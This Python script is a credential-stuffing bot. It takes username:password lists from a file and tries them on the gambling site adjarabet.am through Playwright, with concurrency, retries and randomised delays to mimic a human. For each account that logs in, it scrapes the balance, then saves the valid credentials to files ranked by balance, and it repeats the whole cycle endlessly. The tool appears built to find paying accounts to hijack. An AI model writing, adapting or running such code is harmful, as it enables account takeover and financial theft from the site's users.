import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
from typing import List
import logging
from datetime import datetime
import random
import json
from pathlib import Path
from dataclasses import dataclass
from enum import Enum
import aiofiles
import re

# ================= ENUMS =================
class AccountStatus(Enum):
    SUCCESS = "✅"
    FAILED = "❌"
    TIMEOUT = "⏰"
    BLOCKED = "🚫"

# ================= DATA =================
@dataclass
class Account:
    username: str
    password: str
    status: AccountStatus = AccountStatus.FAILED
    balance: str = ""
    balance_value: float = 0.0
    error: str = ""

@dataclass
class Config:
    headless: bool = True
    max_retries: int = 3
    concurrency: int = 5
    timeout: int = 15000
    delay_min: float = 0.2
    delay_max: float = 0.7
    loop_delay: int = 10   # ⏱️ քանի վայրկյան սպասի ամբողջ ցիկլից հետո

# ================= LOGGER =================
class Logger:
    def __init__(self):
        self.logger = logging.getLogger("BOT")
        if not self.logger.handlers:
            self.logger.setLevel(logging.INFO)

            console = logging.StreamHandler()
            file = logging.FileHandler("bot_log.txt")

            formatter = logging.Formatter("%(asctime)s | %(levelname)s | %(message)s")
            console.setFormatter(formatter)
            file.setFormatter(formatter)

            self.logger.addHandler(console)
            self.logger.addHandler(file)

    def info(self, m): self.logger.info(m)
    def error(self, m): self.logger.error(m)
    def warn(self, m): self.logger.warning(m)

# ================= ACCOUNT LOADER =================
class AccountLoader:
    def __init__(self, file="accounts.txt"):
        self.file = Path(file)

    def load(self) -> List[Account]:
        accs = []
        if not self.file.exists():
            print("accounts.txt not found")
            return accs

        for line in self.file.read_text(encoding="utf-8").splitlines():
            if ":" in line:
                u, p = line.split(":", 1)
                accs.append(Account(u.strip(), p.strip()))
        return accs

# ================= UTILS =================
def parse_balance(text: str) -> float:
    try:
        num = re.sub(r"[^\d.]", "", text)
        return float(num) if num else 0.0
    except:
        return 0.0

# ================= CORE BOT =================
class Bot:
    def __init__(self, config: Config):
        self.cfg = config
        self.log = Logger()
        self.sem = asyncio.Semaphore(config.concurrency)
        self.login_url = "https://www.adjarabet.am/hy"

    async def start(self):
        self.pw = await async_playwright().start()
        self.browser = await self.pw.chromium.launch(headless=self.cfg.headless)

    async def stop(self):
        await self.browser.close()
        await self.pw.stop()

    async def human_delay(self):
        await asyncio.sleep(random.uniform(self.cfg.delay_min, self.cfg.delay_max))

    async def login(self, account: Account):
        async with self.sem:
            for attempt in range(self.cfg.max_retries):
                context = None
                try:
                    context = await self.browser.new_context()
                    page = await context.new_page()

                    await page.goto(self.login_url, timeout=self.cfg.timeout)

                    await page.fill('input[name="userIdentifier"]', account.username)
                    await self.human_delay()

                    await page.fill('input[type="password"]', account.password)
                    await self.human_delay()

                    await page.click('[data-test-id="header-login-button"]')

                    try:
                        balance_el = await page.wait_for_selector(
                            '[data-test-id="header-user-balance"]',
                            timeout=self.cfg.timeout
                        )

                        balance_text = await balance_el.inner_text()

                        account.balance = balance_text
                        account.balance_value = parse_balance(balance_text)
                        account.status = AccountStatus.SUCCESS

                        self.log.info(f"✅ {account.username}:{account.password} | {balance_text}")
                        return

                    except PlaywrightTimeout:
                        account.status = AccountStatus.TIMEOUT
                        account.error = "Balance timeout"

                except Exception as e:
                    account.error = str(e)

                finally:
                    if context:
                        await context.close()

                await asyncio.sleep(2 ** attempt)

            account.status = AccountStatus.FAILED
            self.log.warn(f"❌ {account.username}:{account.password} FAILED")

    async def process_accounts(self):
        loader = AccountLoader()
        accounts = loader.load()

        if not accounts:
            self.log.warn("No accounts found")
            return

        self.log.info(f"Loaded {len(accounts)} accounts")

        tasks = [self.login(acc) for acc in accounts]
        await asyncio.gather(*tasks)

        await self.save_results(accounts)
        self.summary(accounts)

    async def save_results(self, accounts: List[Account]):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        sorted_accounts = sorted(accounts, key=lambda x: x.balance_value, reverse=True)

        async with aiofiles.open("results.txt", "a", encoding="utf-8") as f:
            await f.write(f"\n{'='*60}\n{timestamp}\n{'='*60}\n")
            for acc in sorted_accounts:
                await f.write(
                    f"{acc.status.value} | {acc.username}:{acc.password} | {acc.balance} | {acc.error}\n"
                )

        data = [
            {
                "username": acc.username,
                "password": acc.password,
                "balance": acc.balance,
                "balance_value": acc.balance_value,
                "status": acc.status.value,
                "error": acc.error
            }
            for acc in sorted_accounts
        ]

        async with aiofiles.open("results.json", "w", encoding="utf-8") as f:
            await f.write(json.dumps(data, indent=2, ensure_ascii=False))

    def summary(self, accounts):
        success = sum(1 for a in accounts if a.status == AccountStatus.SUCCESS)
        total = len(accounts)

        print("\n====== RESULT ======")
        print(f"Success: {success}/{total}")
        print(f"Rate: {success/total*100:.1f}%")

# ================= MAIN LOOP =================
async def main():
    cfg = Config()
    bot = Bot(cfg)

    await bot.start()

    try:
        while True:  # 🔥 ԱՆԸՆԴՀԱՏ ՑԻԿԼ
            await bot.process_accounts()

            print("\n🔄 Restarting cycle...\n")
            await asyncio.sleep(cfg.loop_delay)

    except KeyboardInterrupt:
        print("\n⛔ Stopped by user")

    finally:
        await bot.stop()

# ================= RUN =================
if __name__ == "__main__":
    asyncio.run(main())
